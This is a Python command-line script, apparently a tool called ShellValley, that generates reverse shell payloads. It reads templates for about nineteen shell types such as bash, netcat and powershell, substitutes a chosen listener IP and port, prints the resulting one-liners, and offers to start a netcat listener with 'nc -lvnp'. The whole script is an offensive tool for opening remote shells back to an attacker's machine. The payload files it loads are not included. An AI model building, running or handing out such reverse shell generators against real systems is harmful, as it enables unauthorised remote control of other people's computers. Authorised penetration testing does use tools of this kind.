#!/usr/bin/env python3

import os,sys,time,platform,argparse,netifaces

# color codes
class color:
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    WHITE = "\033[1;37m"
    BLUE = "\033[1;35m"
    CYAN = "\033[1;36m"

# greet mesg
greet = f"\n{color.RED}       <<< {color.CYAN}Thanks for using {color.RED}>>>\n"

# checking for sys version 
if sys.version_info.major != 3:
    exit()

# clear terminal 
def clear():
    if platform.system() == "Linux":
        os.system("clear")
    else:
        # this script is now only avaiable for linux
        exit()

# logo 
def logo():
    print(f"""
{color.WHITE} _____ _          _ _ _   _       _ _
{color.WHITE}/  ___| |        | | | | | |     | | |
{color.WHITE}\ `--.| |__   ___| | | | | | __ _| | | ___ _   _
{color.RED} `--. \ '_ \ / _ \ | | | | |/ _` | | |/ _ \ | | |
{color.RED}/\__/ / | | |  __/ | \ \_/ / (_| | | |  __/ |_| |
{color.GREEN}\____/|_| |_|\___|_|_|\___/ \__,_|_|_|\___|\__, |
                                            __/ | {color.WHITE}1.0.0
{color.RED} {color.CYAN}Nabil Rahman {color.WHITE}(github.com/Nabil-Official){color.GREEN}{color.RED}  |___/""")

def disp():
    clear()
    logo()

# default shell
default_shell = "bash"

# avaiable_shells
available_shells = ["bash","php","python","python3","perl",'java','javascript','node',"netcat",'awk','gawk','telnet','golang','powershell','tclsh',"ruby","xterm","ncat","socket"]


# parsing arguments
disp()
print("\n")
parser = argparse.ArgumentParser(description=f"{color.GREEN}=================== Help Center ====================")
parser.add_argument('-l','--list',dest='list',help="list of available shells (More shells will be added in the future)",action='store_true')
parser.add_argument('-i','--ip',dest='lhost',type=str,help="specify IP address",required=False)
parser.add_argument('-p','--port',dest='port',type=int,help="specify port",required=False)

parser.add_argument('-s','--shell',dest='shell',type=str,help="specify shell type",required=False)

args = parser.parse_args()



if args.list:
    disp()
    print("\n")
    print(f"{color.RED}[@] {color.GREEN}Available Shells are : {color.WHITE}",end="")
    for x in available_shells:
        print(x,end=" ")
    print("")
    exit()

if not args.shell:
    shellType = default_shell
else:
    shellType = args.shell 

if not args.lhost:
    disp()
    print("\n")
    print(f"{color.WHITE}  -------[ {color.BLUE}SELECT IP {color.WHITE}]-------\n")
    for vvv in netifaces.interfaces():
        print(f"{color.RED}[+] {color.WHITE}",vvv, f" :{color.GREEN}",netifaces.ifaddresses(vvv)[netifaces.AF_INET][0]['addr'])
    lhost = input(f"\n{color.WHITE}>> Enter IP address : {color.GREEN}")


else:
    lhost = args.lhost

if not args.port:
    port = 1234
else:
    port = args.port

if args.list:
    print("")
    for shells in available_shells:
        print(f"{color.WHITE}[+] {color.GREEN}{shells.lower()}")


def listener():
    print(f"\n{color.RED}   [*] {color.WHITE}Starting listener at port {port}\n{color.GREEN}")
    os.system(f"nc -lvnp {port}")

# display shells:
disp()
if shellType not in available_shells:
    print(f"\n{color.WHITE}[!] {color.RED}Sry, there is no shell available named ({shellType}). Use python3 revshell.py --help.")
    exit()
loc = f'shells/{shellType}'
with open(loc,"r") as shell:
    shells_list = shell.readlines()
    total_shells = len(shells_list)
    print(f"""
  {color.RED}[#] {color.WHITE}ShellType : {color.GREEN}{shellType}
  {color.RED}[#] {color.WHITE}LHOST     : {color.GREEN}{lhost}
  {color.RED}[#] {color.WHITE}LPORT     : {color.GREEN}{port}
  {color.RED}[#] {color.WHITE}Please Wait.....{color.GREEN}""")
    time.sleep(0.5)
    for shell in shells_list:
        shell = shell.strip()
        shell = shell.replace("$IP",lhost)
        shell = shell.replace("$PORT",str(port))
        if "." not in shell:
            print(f"\n<<<< {color.WHITE}{shell} {color.GREEN}>>>>\n")
        else:
            print(f"{color.WHITE}---> {color.RED}{shell}{color.GREEN}")
    user = input(f"\n{color.RED}>> {color.WHITE}Do you want to start listener? (y/n) {color.GREEN}: ")
    if user == "y" or user == "yes":
        listener()
    elif user == "n" or user == "no":
        print(greet)
        exit()
    else:
        print(greet)
        exit()
